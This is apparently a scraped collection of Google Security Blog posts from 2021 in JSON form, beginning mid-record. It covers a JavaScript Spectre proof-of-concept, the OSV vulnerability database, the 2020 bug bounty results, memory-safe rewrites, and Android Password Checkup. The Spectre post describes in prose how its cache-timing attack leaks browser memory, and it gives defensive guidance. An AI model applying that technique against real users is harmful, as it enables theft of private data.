Read Blocking    in Google Chrome, or    Project Fission    in Firefox), the design of existing web APIs still makes it possible for data to inadvertently flow into an attacker's process.     With this in mind, web developers should consider more robustly isolating their sites by using    new security mechanisms    that actively deny attackers access to cross-origin resources. These protections mitigate Spectre-style hardware attacks and common web-level    cross-site leaks   , but require developers to assess the threat these vulnerabilities pose to their applications and understand how to deploy them. To assist in that evaluation, Chrome's web platform security team has published    Post-Spectre Web Development    and    Mitigating Side-Channel Attacks    with concrete advice for developers; we strongly recommend following their guidance and enabling the following protections:        Cross-Origin Resource Policy    (CORP) and    Fetch Metadata Request Headers    allow developers to control which sites can embed their resources, such as images or scripts, preventing data from being delivered to an attacker-controlled browser    renderer process   . See    resourcepolicy.fyi    and    web.dev/fetch-metadata   .          Cross-Origin Opener Policy    (COOP) lets developers ensure that their application window will not receive unexpected interactions from other websites, allowing the browser to isolate it in its own process. This adds an important process-level protection, particularly in browsers which don't enable full Site Isolation; see    web.dev/coop-coep   .          Cross-Origin Embedder Policy    (COEP) ensures that any authenticated resources requested by the application have explicitly opted in to being loaded.&nbsp; Today, to guarantee process-level isolation for highly sensitive applications in Chrome or Firefox, applications must enable both COEP and COOP; see    web.dev/coop-coep   .       In addition to enabling these isolation mechanisms, ensure your application also enables standard protections, such as the    X-Frame-Options    and    X-Content-Type-Options    headers, and uses    SameSite cookies   . Many Google applications have already deployed, or are in the process of deploying these mechanisms, providing a defense against speculative execution bugs in situations where default browser protections are insufficient.&nbsp;     It's important to note that while all of the mechanisms described in this article are important and powerful security primitives, they don't guarantee complete protection against Spectre; they require a considered deployment approach which takes behaviors specific to the given application into account. We encourage security engineers and researchers to use and contribute to our Spectre    proof-of-concept    to review and improve the security posture of their sites.               Tip  : To help you protect your website from Spectre, the Google Security Team has created    Spectroscope   , a prototype Chrome extension that scans your application and finds resources which may require enabling additional defenses. Consider using it to assist with your deployments of web isolation features.                                       Posted by Stephen Röttger and Artur Janc, Information Security EngineersThree years ago, Spectre changed the way we think about security boundaries on the web. It quickly became clear that flaws in modern processors undermined the guarantees that web browsers could make about preventing data leaks between applications. As a result, web browser vendors have been continuously collaborating on approaches intended to harden the platform at scale. Nevertheless, this class of attacks still remains a concern and requires web developers to deploy application-level mitigations.In this post, we will share the results of Google Security Team's research on the exploitability of Spectre against web users, and present a fast, versatile proof-of-concept (PoC) written in JavaScript which can leak information from the browser's memory. We've confirmed that this proof-of-concept, or its variants, function across a variety of operating systems, processor architectures, and hardware generations.By sharing our findings with the security community, we aim to give web application owners a better understanding of the impact Spectre vulnerabilities can have on the security of their users' data. Finally, this post describes the protections available to web authors and best practices for enabling them in web applications, based on our experience across Google.A bit of backgroundThe Spectre vulnerability, disclosed to the public in January 2018, makes use of a class of processor (CPU) design vulnerabilities that allow an attacker to change the intended program control flow while the CPU is speculatively executing subsequent instructions. For example, the CPU may speculate that a length check passes, while in practice it will access out-of-bounds memory. While the CPU state is rolled back once the misprediction is noticed, this behavior leaves observable side effects which can leak data to an attacker.In 2019, the team responsible for V8, Chrome’s JavaScript engine, published a blog post and whitepaper concluding that such attacks can’t be reliably mitigated at the software level. Instead, robust solutions to these issues require security boundaries in applications such as web browsers to be aligned with low-level primitives, for example process-based isolation. In parallel, browser vendors and standards bodies developed security mechanisms to protect web users from these classes of attacks. This included both architectural changes which offer default protections enabled in some browser configurations (such as Site Isolation, out-of-process iframes, and Cross-Origin Read Blocking), as well as broadly applicable opt-in security features that web developers can deploy in their applications: Cross-Origin Resource Policy, Cross-Origin Opener Policy, Cross-Origin Embedder Policy, and others.These mechanisms, while crucially important, don't prevent the exploitation of Spectre; rather, they protect sensitive data from being present in parts of the memory from which they can be read by the attacker. To evaluate the robustness of these defenses, it's therefore important to develop security tools that help security engineers understand the practical implications of speculative execution attacks for their applications.Demonstrating Spectre in a web browserToday, we’re sharing proof-of-concept (PoC) code that confirms the practicality of Spectre exploits against JavaScript engines. We use Google Chrome to demonstrate our attack, but these issues are not specific to Chrome, and we expect that other modern browsers are similarly vulnerable to this exploitation vector. We have developed an interactive demonstration of the attack available at https://leaky.page/; the code and a more detailed writeup are published on Github here.The demonstration website can leak data at a speed of 1kB/s when running on Chrome 88 on an Intel Skylake CPU. Note that the code will likely require minor modifications to apply to other CPUs or browser versions; however, in our tests the attack was successful on several other processors, including the Apple M1 ARM CPU, without any major changes.While experimenting, we also developed other PoCs with different properties. Some examples include:A PoC which can leak 8kB/s of data at a cost of reduced stability using performance.now() as a timer with 5μs precision.A PoC which leaks data at 60B/s using timers with a precision of 1ms or worse.We chose to release the current PoC since it has a negligible setup time and works in the absence of high precision timers, such as SharedArrayBuffer.The main building blocks of the PoC are:A Spectre gadget: code that triggers attacker-controlled transient execution.A side-channel: a way to observe side effects of the transient execution.1. The gadgetFor the published PoC, we implemented a simple Variant 1 gadget: a JavaScript array is speculatively accessed out of bounds after training the branch predictor that the compiler-inserted length check will succeed. This particular gadget can be mitigated at the software level; however, Chrome's V8 team concluded that this is not the case for other gadgets: “we found that effective mitigation of some variants of Spectre, particularly variant 4, to be simply infeasible in software.”We invite the security community to extend our research and develop code that makes use of other Spectre gadgets.2. The side-channelA common way to leak secret data via speculative execution is to use a cache side-channel. By observing if a certain memory location is present in the cache or not, we can infer if it has been accessed during the speculative execution. The challenge in JavaScript is to find a high resolution timer allowing to distinguish cache from memory accesses, as modern browsers have reduced the timer granularity of the performance.now() API and disabled SharedArrayBuffers in contexts without cross-origin isolation to prevent timing attacks.Already in 2018, the V8 team shared their observation that reduced timer granularity is not sufficient to mitigate Spectre, since attackers can arbitrarily amplify timing differences. The presented amplification technique was based on reading secret data multiple times which can, however, reduce the effectiveness of the attack if the information leak is probabilistic.In our PoC, we developed a new technique that overcomes this limitation. By abusing the behavior of the Tree-PLRU cache eviction strategy commonly found in modern CPUs, we were able to significantly amplify the cache timing with a single read of secret data. This allowed us to leak data efficiently even with low precision timers. For technical details, see the demonstration at https://leaky.page/plru.html.While we don't believe this particular PoC can be re-used for nefarious purposes without significant modifications, it serves as a compelling demonstration of the risks of Spectre. In particular, we hope it provides a clear signal for web application developers that they need to consider this risk in their security evaluations and take active steps to protect their sites.Deploying web defenses against SpectreThe low-level nature of speculative execution vulnerabilities makes them difficult to fix comprehensively, as a proper patch can require changes to the firmware or hardware on the user's device. While operating system and web browser developers have implemented important built-in protections where possible (including Site Isolation with out-of-process iframes and Cross-Origin Read Blocking in Google Chrome, or Project Fission in Firefox), the design of existing web APIs still makes it possible for data to inadvertently flow into an attacker's process.With this in mind, web developers should consider more robustly isolating their sites by using new security mechanisms that actively deny attackers access to cross-origin resources. These protections mitigate Spectre-style hardware attacks and common web-level cross-site leaks, but require developers to assess the threat these vulnerabilities pose to their applications and understand how to deploy them. To assist in that evaluation, Chrome's web platform security team has published Post-Spectre Web Development and Mitigating Side-Channel Attacks with concrete advice for developers; we strongly recommend following their guidance and enabling the following protections:Cross-Origin Resource Policy (CORP) and Fetch Metadata Request Headers allow developers to control which sites can embed their resources, such as images or scripts, preventing data from being delivered to an attacker-controlled browser renderer process. See resourcepolicy.fyi and web.dev/fetch-metadata.Cross-Origin Opener Policy (COOP) lets developers ensure that their application window will not receive unexpected interactions from other websites, allowing the browser to isolate it in its own process. This adds an important process-level protection, particularly in browsers which don't enable full Site Isolation; see web.dev/coop-coep.Cross-Origin Embedder Policy (COEP) ensures that any authenticated resources requested by the application have explicitly opted in to being loaded.  Today, to guarantee process-level isolation for highly sensitive applications in Chrome or Firefox, applications must enable both COEP and COOP; see web.dev/coop-coep.In addition to enabling these isolation mechanisms, ensure your application also enables standard protections, such as the X-Frame-Options and X-Content-Type-Options headers, and uses SameSite cookies. Many Google applications have already deployed, or are in the process of deploying these mechanisms, providing a defense against speculative execution bugs in situations where default browser protections are insufficient. It's important to note that while all of the mechanisms described in this article are important and powerful security primitives, they don't guarantee complete protection against Spectre; they require a considered deployment approach which takes behaviors specific to the given application into account. We encourage security engineers and researchers to use and contribute to our Spectre proof-of-concept to review and improve the security posture of their sites.Tip: To help you protect your website from Spectre, the Google Security Team has created Spectroscope, a prototype Chrome extension that scans your application and finds resources which may require enabling additional defenses. Consider using it to assist with your deployments of web isolation features.     ", "date": "March 12, 2021"},
{"website": "Google-Security", "title": "\nLaunching OSV - Better vulnerability triage for open source\n", "author": ["Posted by Oliver Chang and Kim Lewandowski, Google Security Team"], "link": "https://security.googleblog.com/2021/02/launching-osv-better-vulnerability.html", "abstract": "                             Posted by Oliver Chang and Kim Lewandowski, Google Security Team                     We are excited to launch    OSV    (Open Source Vulnerabilities), our first step towards improving vulnerability triage for developers and consumers of open source software.   The goal of OSV is to provide precise data on where a vulnerability was introduced and where it got fixed, thereby helping consumers of open source software accurately identify if they are impacted and then make security fixes as quickly as possible. We have started OSV with a data set of fuzzing vulnerabilities found by the    OSS-Fuzz    service. OSV project evolved from our recent efforts to improve vulnerability management in open source (   \"Know, Prevent, Fix\" framework   ).     Vulnerability management can be painful for both consumers and maintainers of open source software, with tedious manual work involved in many cases.     For consumers of open source software, it is often difficult to map a vulnerability such as a    Common Vulnerabilities and Exposures (CVE)    entry to the package versions they are using. This comes from the fact that versioning schemes in existing vulnerability standards (such as    Common Platform Enumeration (CPE)   ) do not map well with the actual open source versioning schemes, which are typically versions/tags and commit hashes. The result is missed vulnerabilities that affect downstream consumers.     Similarly, it is time consuming for maintainers to determine an accurate list of affected versions or commits across all their branches for downstream consumers after a vulnerability is fixed, in addition to the process required for publication. Unfortunately, many open source projects,    including ones that are critical to modern infrastructure   , are under resourced and overworked. Maintainers don't always have the bandwidth to create and publish thorough, accurate information about their vulnerabilities even if they want to.     These challenges result in open source consumers not incorporating important security fixes promptly.    OSV    aims to:      Reduce the work required by maintainers to publish vulnerabilities, and      Improve the accuracy of vulnerability queries for downstream consumers by providing precise vulnerability metadata in an easy-to-query database (complementing existing vulnerability databases).      Automation    OSV aims to simplify the vulnerability reporting process for an open source package maintainer by accurately determining the list of affected versions and commits. This requires providing both the commits that introduce and fix the bugs. If that information is not available, OSV requires providing a reproduction test case and steps to generate an application build, and then it performs    bisection    to find these commits in an automated fashion. OSV takes care of the rest of the analysis to figure out impacted commit ranges (accounting for cherry picks) and versions/tags.              How OSV works     OSV automates the triage workflow for an open source package consumer by providing an API to query for vulnerabilities. A typical OSV workflow for a package consumer looks like the picture above:      A package consumer sends a query to OSV with a package version or commit hash as input.       &nbsp;&nbsp;curl -X POST -d \\    &nbsp;&nbsp;&nbsp;&nbsp;'{  \"commit\"  :   \"6879efc2c1596d11a6a6ad296f80063b558d5e0f\"  }' \\    &nbsp;&nbsp;&nbsp;&nbsp;  'https://api.osv.dev/v1/query?key=$API_KEY'    &nbsp;&nbsp;&nbsp;&nbsp;    &nbsp;&nbsp;curl -X POST -d \\    &nbsp;&nbsp;&nbsp;&nbsp;'{  \"version\"  :   \"1.0.0\"  ,   \"package\"  : {  \"name\"  :   \"pkg\"  ,   \"ecosystem\"  :   \"pypi\"  }' \\    &nbsp;&nbsp;&nbsp;&nbsp;  '   https://api.osv.dev/v1/query?key=$API_KEY   '       OSV looks up the set of vulnerabilities affecting that particular version and returns a list of vulnerabilities impacting the package. The vulnerability metadata is returned in a    machine-readable JSON format   .         The package consumer uses this information to either cherry-pick security fixes (based on precise fix metadata) or update to a later version.       Ongoing work    OSV currently provides access to thousands of vulnerabilities from    380+ critical OSS projects    integrated with    OSS-Fuzz   . We are planning to work with open source communities to extend with data from various language ecosystems (e.g. NPM, PyPI) and work out a pipeline for package maintainers to submit vulnerabilities with minimal work.     Our goal with OSV is to rethink and promote better, scalable vulnerability tracking for open source. In an ideal world, vulnerability management should be done closer to the actual open source development process, aided by automated infrastructure. Projects that depend on open source should be promptly notified and fixes uptaken quickly when a vulnerability is reported.    You can access the OSV website and documentation at    https://osv.dev   . You can explore the open source repo or contribute to the project on    GitHub   , and join the    mailing list    to stay up to date with OSV and share your thoughts on vulnerability tracking.                                       Posted by Oliver Chang and Kim Lewandowski, Google Security TeamWe are excited to launch OSV (Open Source Vulnerabilities), our first step towards improving vulnerability triage for developers and consumers of open source software. The goal of OSV is to provide precise data on where a vulnerability was introduced and where it got fixed, thereby helping consumers of open source software accurately identify if they are impacted and then make security fixes as quickly as possible. We have started OSV with a data set of fuzzing vulnerabilities found by the OSS-Fuzz service. OSV project evolved from our recent efforts to improve vulnerability management in open source (\"Know, Prevent, Fix\" framework).Vulnerability management can be painful for both consumers and maintainers of open source software, with tedious manual work involved in many cases.For consumers of open source software, it is often difficult to map a vulnerability such as a Common Vulnerabilities and Exposures (CVE) entry to the package versions they are using. This comes from the fact that versioning schemes in existing vulnerability standards (such as Common Platform Enumeration (CPE)) do not map well with the actual open source versioning schemes, which are typically versions/tags and commit hashes. The result is missed vulnerabilities that affect downstream consumers.Similarly, it is time consuming for maintainers to determine an accurate list of affected versions or commits across all their branches for downstream consumers after a vulnerability is fixed, in addition to the process required for publication. Unfortunately, many open source projects, including ones that are critical to modern infrastructure, are under resourced and overworked. Maintainers don't always have the bandwidth to create and publish thorough, accurate information about their vulnerabilities even if they want to.These challenges result in open source consumers not incorporating important security fixes promptly. OSV aims to:Reduce the work required by maintainers to publish vulnerabilities, andImprove the accuracy of vulnerability queries for downstream consumers by providing precise vulnerability metadata in an easy-to-query database (complementing existing vulnerability databases).AutomationOSV aims to simplify the vulnerability reporting process for an open source package maintainer by accurately determining the list of affected versions and commits. This requires providing both the commits that introduce and fix the bugs. If that information is not available, OSV requires providing a reproduction test case and steps to generate an application build, and then it performs bisection to find these commits in an automated fashion. OSV takes care of the rest of the analysis to figure out impacted commit ranges (accounting for cherry picks) and versions/tags.How OSV worksOSV automates the triage workflow for an open source package consumer by providing an API to query for vulnerabilities. A typical OSV workflow for a package consumer looks like the picture above:A package consumer sends a query to OSV with a package version or commit hash as input.  curl -X POST -d \\    '{\"commit\": \"6879efc2c1596d11a6a6ad296f80063b558d5e0f\"}' \\    'https://api.osv.dev/v1/query?key=$API_KEY'      curl -X POST -d \\    '{\"version\": \"1.0.0\", \"package\": {\"name\": \"pkg\", \"ecosystem\": \"pypi\"}' \\    'https://api.osv.dev/v1/query?key=$API_KEY'OSV looks up the set of vulnerabilities affecting that particular version and returns a list of vulnerabilities impacting the package. The vulnerability metadata is returned in a machine-readable JSON format.The package consumer uses this information to either cherry-pick security fixes (based on precise fix metadata) or update to a later version.Ongoing workOSV currently provides access to thousands of vulnerabilities from 380+ critical OSS projects integrated with OSS-Fuzz. We are planning to work with open source communities to extend with data from various language ecosystems (e.g. NPM, PyPI) and work out a pipeline for package maintainers to submit vulnerabilities with minimal work.Our goal with OSV is to rethink and promote better, scalable vulnerability tracking for open source. In an ideal world, vulnerability management should be done closer to the actual open source development process, aided by automated infrastructure. Projects that depend on open source should be promptly notified and fixes uptaken quickly when a vulnerability is reported.You can access the OSV website and documentation at https://osv.dev. You can explore the open source repo or contribute to the project on GitHub, and join the mailing list to stay up to date with OSV and share your thoughts on vulnerability tracking.      ", "date": "February 5, 2021"},
{"website": "Google-Security", "title": "\nVulnerability Reward Program: 2020 Year in Review \n", "author": ["Posted by Anna Hupa, Senior Strategist, Vulnerability Rewards Team"], "link": "https://security.googleblog.com/2021/02/vulnerability-reward-program-2020-year.html", "abstract": "                             Posted by Anna Hupa, Senior Strategist, Vulnerability Rewards Team    Despite the challenges of this unprecedented year, our vulnerability researchers have achieved more than ever before, partnering with our Vulnerability Reward Programs (VRPs) to protect Google&#8217;s users by discovering security and abuse bugs and reporting them to us for remediation. Their diligence helps us keep our users, and the internet at large, safe, and enables us to fix security issues before they can be exploited.     The incredibly hard work, dedication, and expertise of our researchers in 2020 resulted in a record-breaking payout of over  $6.7  million in rewards, with an additional $280,000 given to charity. We&#8217;d like to extend a big  thank you  to our community of researchers for collaborating with us. It&#8217;s your excellent work that brings our programs to life, so we wanted to take a moment to look back on last year&#8217;s successes.           Our rewards programs span several Google product areas, including Chrome, Android, and the Google Play Store. As in  past years , we are sharing our 2020 Year in Review statistics across all of these programs.             Android&nbsp;     2020 was a fantastic year for the Android VRP, and in response to the valiant efforts of multiple teams of researchers, we paid out  $1.74M  in rewards. Following our increase in exploit payouts in  November 2019 , we received a record 13 working exploit submissions in 2020, representing  over $1M  in exploit reward payouts. Some highlights include:       We awarded our first-ever Android 11 developer preview bonus, which paid out over  $50,000  across 11 reports. This allowed us to patch the issues proactively, before the official release of  Android 11.    Guang Gong ( @oldfresher ) and his team at 360 Alpha Lab, Qihoo 360 Technology Co. Ltd., now hold a record 8 exploits (30% of the all-time total) on the leaderboard. Most recently, Alpha Lab submitted an impressive 1-click remote root exploit targeting recent Android devices. They maintain the top Android payout ($161,337, plus another $40,000 from Chrome VRP) for their 2019 exploit.    Another researcher submitted an additional two exploits, and is vying for the top all-time spot with an impressive  $400,000  in all-time exploit payouts.        In addition, we launched a number of pilot rewards programs to guide security researchers toward additional areas of interest, including Android Auto OS, writing fuzzers for Android code, and a reward program for Android chipsets. And in 2021, we'll be working on additional improvements and exciting initiatives related to our programs.      Chrome&nbsp;     Chrome has also seen a record year of VRP payouts! We increased our reward amounts in July 2019, and as a result, 2020 has seen us pay out 83% more than 2019, totalling  $2.1M  across 300 bugs.     In 2019, 14% of our payouts were for V8 bugs. This decreased to just 6% in 2020. At the end of 2020, we  announced a further bonus reward for clearly exploitable V8 bugs , so we expect to see this amount increase again in 2021.      Google Play&nbsp;     It&#8217;s been another stellar year for the Google Play Security Rewards Program! This year, we expanded the criteria for qualifying Android apps to include apps utilizing the  Exposure Notification API  and performing contact tracing to help combat Covid-19. We also increased our maximum bounty award amount to $20,000 for qualifying vulnerabilities.      In 2020, the Google Play Security Rewards Program and Developer Data Protection Reward Program awarded over  $270,000  to Android researchers around the world.       Abuse Program      Beyond typical security vulnerabilities, we remain interested in research focused on abuse-related risks.     The Abuse program released an official definition describing what an  abuse risk  is and how abuse-related reports are assessed. We also  announced  increased rewards for reports focused on abuse-related methodologies. These efforts led to a huge spike of abuse-related reports. In fact, we received more than twice as many reports in 2020 as in 2019, a level of growth we&#8217;ve never seen before. The fantastic work of our researchers in 2020 allowed us to identify and fix over 100 issues across more than 60 different products.      Research Grants      Besides reward payouts, in 2020 we also awarded over  $400,000  in grants to more than 180 security researchers around the world, which is a record for this  program . More than a third of these grants were awarded in  response to the Covid-19 crisis , to extend our support to researchers and enable them to continue with their work. Our researchers got back to us with over 200 reports which resulted in more than 100 identified vulnerabilities.       \"The point is, the value of these research grants is not $1337, $500 or $5000 etc. It is priceless!\"  &#8211;  Research Grantee       Looking Forward      Finally, because of the ongoing Covid-19 pandemic and related restrictions on travel last year, we couldn&#8217;t keep our tradition of meeting our bug hunters in person and organizing events like  ESCAL8 , where we can engage with our incredible community of researchers. Like everyone else, we are full of hope that 2021 will allow us to meet in person again, and celebrate the 10 year VRP anniversary and the fantastic work our researchers have contributed during this time.      We look forward to another year of working with our security researchers to make Google, Android, Chrome and the Google Play Store safer for everyone. Follow us on  @GoogleVRP  to keep tabs on the latest.       Thank you to Mike Antares, Adam Bacchus, Dirk Göhmann, Amy Ressler, Martin Straka, Adrian Taylor and Jan Keller for their contributions to this post.                                      Posted by Anna Hupa, Senior Strategist, Vulnerability Rewards Team  Despite the challenges of this unprecedented year, our vulnerability researchers have achieved more than ever before, partnering with our Vulnerability Reward Programs (VRPs) to protect Google’s users by discovering security and abuse bugs and reporting them to us for remediation. Their diligence helps us keep our users, and the internet at large, safe, and enables us to fix security issues before they can be exploited.   The incredibly hard work, dedication, and expertise of our researchers in 2020 resulted in a record-breaking payout of over $6.7 million in rewards, with an additional $280,000 given to charity. We’d like to extend a big thank you to our community of researchers for collaborating with us. It’s your excellent work that brings our programs to life, so we wanted to take a moment to look back on last year’s successes.    Our rewards programs span several Google product areas, including Chrome, Android, and the Google Play Store. As in past years, we are sharing our 2020 Year in Review statistics across all of these programs.     Android   2020 was a fantastic year for the Android VRP, and in response to the valiant efforts of multiple teams of researchers, we paid out $1.74M in rewards. Following our increase in exploit payouts in November 2019, we received a record 13 working exploit submissions in 2020, representing over $1M in exploit reward payouts. Some highlights include:    We awarded our first-ever Android 11 developer preview bonus, which paid out over $50,000 across 11 reports. This allowed us to patch the issues proactively, before the official release of  Android 11.  Guang Gong (@oldfresher) and his team at 360 Alpha Lab, Qihoo 360 Technology Co. Ltd., now hold a record 8 exploits (30% of the all-time total) on the leaderboard. Most recently, Alpha Lab submitted an impressive 1-click remote root exploit targeting recent Android devices. They maintain the top Android payout ($161,337, plus another $40,000 from Chrome VRP) for their 2019 exploit.  Another researcher submitted an additional two exploits, and is vying for the top all-time spot with an impressive $400,000 in all-time exploit payouts.     In addition, we launched a number of pilot rewards programs to guide security researchers toward additional areas of interest, including Android Auto OS, writing fuzzers for Android code, and a reward program for Android chipsets. And in 2021, we'll be working on additional improvements and exciting initiatives related to our programs.   Chrome   Chrome has also seen a record year of VRP payouts! We increased our reward amounts in July 2019, and as a result, 2020 has seen us pay out 83% more than 2019, totalling $2.1M across 300 bugs.   In 2019, 14% of our payouts were for V8 bugs. This decreased to just 6% in 2020. At the end of 2020, we announced a further bonus reward for clearly exploitable V8 bugs, so we expect to see this amount increase again in 2021.   Google Play   It’s been another stellar year for the Google Play Security Rewards Program! This year, we expanded the criteria for qualifying Android apps to include apps utilizing the Exposure Notification API and performing contact tracing to help combat Covid-19. We also increased our maximum bounty award amount to $20,000 for qualifying vulnerabilities.    In 2020, the Google Play Security Rewards Program and Developer Data Protection Reward Program awarded over $270,000 to Android researchers around the world.    Abuse Program   Beyond typical security vulnerabilities, we remain interested in research focused on abuse-related risks.   The Abuse program released an official definition describing what an abuse risk is and how abuse-related reports are assessed. We also announced increased rewards for reports focused on abuse-related methodologies. These efforts led to a huge spike of abuse-related reports. In fact, we received more than twice as many reports in 2020 as in 2019, a level of growth we’ve never seen before. The fantastic work of our researchers in 2020 allowed us to identify and fix over 100 issues across more than 60 different products.   Research Grants   Besides reward payouts, in 2020 we also awarded over $400,000 in grants to more than 180 security researchers around the world, which is a record for this program. More than a third of these grants were awarded in response to the Covid-19 crisis, to extend our support to researchers and enable them to continue with their work. Our researchers got back to us with over 200 reports which resulted in more than 100 identified vulnerabilities.    \"The point is, the value of these research grants is not $1337, $500 or $5000 etc. It is priceless!\"  –  Research Grantee   Looking Forward   Finally, because of the ongoing Covid-19 pandemic and related restrictions on travel last year, we couldn’t keep our tradition of meeting our bug hunters in person and organizing events like ESCAL8, where we can engage with our incredible community of researchers. Like everyone else, we are full of hope that 2021 will allow us to meet in person again, and celebrate the 10 year VRP anniversary and the fantastic work our researchers have contributed during this time.    We look forward to another year of working with our security researchers to make Google, Android, Chrome and the Google Play Store safer for everyone. Follow us on @GoogleVRP to keep tabs on the latest.    Thank you to Mike Antares, Adam Bacchus, Dirk Göhmann, Amy Ressler, Martin Straka, Adrian Taylor and Jan Keller for their contributions to this post.      ", "date": "February 4, 2021"},
{"website": "Google-Security", "title": "\nMitigating Memory Safety Issues in Open Source Software\n", "author": ["Posted by Dan Lorenc, Infrastructure Security Team"], "link": "https://security.googleblog.com/2021/02/mitigating-memory-safety-issues-in-open.html", "abstract": "                             Posted by Dan Lorenc, Infrastructure Security Team        Memory-safety vulnerabilities have dominated the security field for years and often lead to issues that can be exploited to take over entire systems.&nbsp;     A  recent study  found   that \"~70% of the vulnerabilities addressed through a security update each year continue to be memory safety issues.&#8221; Another analysis on security issues in the ubiquitous `curl` command line tool showed that    53 out of 95 bugs    would have been completely prevented by using a memory-safe language.          Software written in unsafe languages often contains hard-to-catch bugs that can result in severe security vulnerabilities, and we take these issues seriously at Google. That&#8217;s why we&#8217;re expanding our collaboration with the    Internet Security Research Group    to support the reimplementation of critical open-source software in memory-safe languages. We previously worked with the ISRG to help secure the Internet by making TLS certificates available to everyone for free, and we're looking forward to continuing to work together on this new initiative.      It's time to start taking advantage of memory-safe programming languages that prevent these errors from being introduced. At Google, we    understand the value    of the open source community and in giving back to support a strong ecosystem.&nbsp;     To date, our free    OSS-Fuzz    service has found over    5,500 vulnerabilities    across 375 open source projects caused by memory safety errors, and our    Rewards Program    helps encourage adoption of fuzzing through financial incentives. We've also released other projects like    Syzkaller    to detect    bugs    in operating system kernels, and sandboxes like&nbsp;   gVisor    to reduce the impact of bugs when they are found.     The ISRG's approach of working directly with maintainers to support rewriting tools and libraries incrementally falls directly in line with our perspective here at Google.&nbsp;     The new Rust-based    HTTP and TLS backends    for curl and now this new TLS library for Apache httpd are an important starting point in this overall effort. These codebases sit at the gateway to the internet and their security is critical in the protection of data for millions of users worldwide.&nbsp;     We'd like to thank the maintainers of these projects for working on such widely-used and important infrastructure, and for participating in this effort.     We're happy to be able to support these communities and the ISRG to make the Internet a safer place. We appreciate their leadership in this area and we look forward to expanding this program in 2021.           Open source security is a collaborative effort. If you're interested in learning more about our efforts, please join us in the    Securing Critical Projects    Working Group of the    Open Source Security Foundation   .                                        Posted by Dan Lorenc, Infrastructure Security TeamMemory-safety vulnerabilities have dominated the security field for years and often lead to issues that can be exploited to take over entire systems. A recent study found that \"~70% of the vulnerabilities addressed through a security update each year continue to be memory safety issues.” Another analysis on security issues in the ubiquitous `curl` command line tool showed that 53 out of 95 bugs would have been completely prevented by using a memory-safe language.Software written in unsafe languages often contains hard-to-catch bugs that can result in severe security vulnerabilities, and we take these issues seriously at Google. That’s why we’re expanding our collaboration with the Internet Security Research Group to support the reimplementation of critical open-source software in memory-safe languages. We previously worked with the ISRG to help secure the Internet by making TLS certificates available to everyone for free, and we're looking forward to continuing to work together on this new initiative.It's time to start taking advantage of memory-safe programming languages that prevent these errors from being introduced. At Google, we understand the value of the open source community and in giving back to support a strong ecosystem. To date, our free OSS-Fuzz service has found over 5,500 vulnerabilities across 375 open source projects caused by memory safety errors, and our Rewards Program helps encourage adoption of fuzzing through financial incentives. We've also released other projects like Syzkaller to detect bugs in operating system kernels, and sandboxes like gVisor to reduce the impact of bugs when they are found.The ISRG's approach of working directly with maintainers to support rewriting tools and libraries incrementally falls directly in line with our perspective here at Google. The new Rust-based HTTP and TLS backends for curl and now this new TLS library for Apache httpd are an important starting point in this overall effort. These codebases sit at the gateway to the internet and their security is critical in the protection of data for millions of users worldwide. We'd like to thank the maintainers of these projects for working on such widely-used and important infrastructure, and for participating in this effort.We're happy to be able to support these communities and the ISRG to make the Internet a safer place. We appreciate their leadership in this area and we look forward to expanding this program in 2021. Open source security is a collaborative effort. If you're interested in learning more about our efforts, please join us in the Securing Critical Projects Working Group of the Open Source Security Foundation.     ", "date": "February 17, 2021"},
{"website": "Google-Security", "title": "\nNew Password Checkup Feature Coming to Android\n", "author": ["Posted by Arvind Kumar Sugumar, Software Engineer, Android Team"], "link": "https://security.googleblog.com/2021/02/new-password-checkup-feature-coming-to.html", "abstract": "                             Posted by Arvind Kumar Sugumar, Software Engineer, Android Team     (Note: We&#8217;ve updated this post to reflect that the API works by collecting 3.25 bytes of the hashed username)    With the proliferation of digital services in our lives, it&#8217;s more important than ever to make sure our online information remains safe and secure. Passwords are usually the first line of defense against hackers, and with the number of data breaches that could publicly expose those passwords, users must be vigilant about safeguarding their credentials.      To make this easier, Chrome introduced the  Password Checkup feature  in 2019, which notifies you when one of the passwords you&#8217;ve saved in Chrome is exposed. We&#8217;re now bringing this functionality to your Android apps through Autofill with Google. Whenever you fill or save credentials into an app, we&#8217;ll check those credentials against a list of known compromised credentials and alert you if your password has been compromised. The prompt can also take you to your  Password Manager page , where you can do a comprehensive review of your saved passwords. Password Checkup on Android apps is available on Android 9 and above, for users of Autofill with Google.            Follow the instructions below to enable Autofill with Google on your Android device:       Open your phone&#8217;s  Settings  app   Tap  System  >  Languages & input  >  Advanced    Tap Autofill service   Tap Google to make sure the setting is enabled       If you can&#8217;t find these options, check out  this page  with details on how to get information from your device manufacturer.      How it works      User privacy is top of mind, especially when it comes to features that handle sensitive data such as passwords. Autofill with Google is built on the Android autofill framework which enforces strict privacy & security invariants that ensure that we have access to the user&#8217;s credentials only in the following two cases: 1) the user has already saved said credential to their Google account; 2) the user was offered to save a new credential by the Android OS and chose to save it to their account.      When the user interacts with a credential by either filling it into a form or saving it for the first time, we use the same privacy preserving API that powers the feature in Chrome to check if the credential is part of the list of known compromised passwords tracked by Google.      This implementation ensures that:       Only an encrypted hash of the credential leaves the device (the first 3.25 bytes of the hashed username are sent unencrypted to partition the database)   The server returns a list of encrypted hashes of known breached credentials that share the same prefix   The actual determination of whether the credential has been breached happens locally on the user&#8217;s device   The server (Google) does not have access to the unencrypted hash of the user&#8217;s password and the client (User) does not have access to the list of unencrypted hashes of potentially breached credentials       For more information on how this API is built under the hood, check out  this blog  from the Chrome team.      Additional security features      In addition to Password Checkup, Autofill with Google offers other features to help you keep your data secure:        Password generation:  With so many credentials to manage, it&#8217;s easy for users to recycle the same password across multiple accounts. With password generation, we&#8217;ll generate a unique, secure password for you and save it to your Google account so you don&#8217;t have to remember it at all. On Android, you can request password generation for an app by long pressing the password field and selecting &#8220;Autofill&#8221; in the pop-up menu.            Biometric authentication:  You can add an extra layer of protection on your device by requiring biometric authentication any time you autofill your credentials or payment information. Biometric authentication can be enabled inside of the Autofill with Google settings.        As always, stay tuned to the Google Security blog to keep up to date on the latest ways we&#8217;re improving security across our products.                                      Posted by Arvind Kumar Sugumar, Software Engineer, Android Team  (Note: We’ve updated this post to reflect that the API works by collecting 3.25 bytes of the hashed username)  With the proliferation of digital services in our lives, it’s more important than ever to make sure our online information remains safe and secure. Passwords are usually the first line of defense against hackers, and with the number of data breaches that could publicly expose those passwords, users must be vigilant about safeguarding their credentials.    To make this easier, Chrome introduced the Password Checkup feature in 2019, which notifies you when one of the passwords you’ve saved in Chrome is exposed. We’re now bringing this functionality to your Android apps through Autofill with Google. Whenever you fill or save 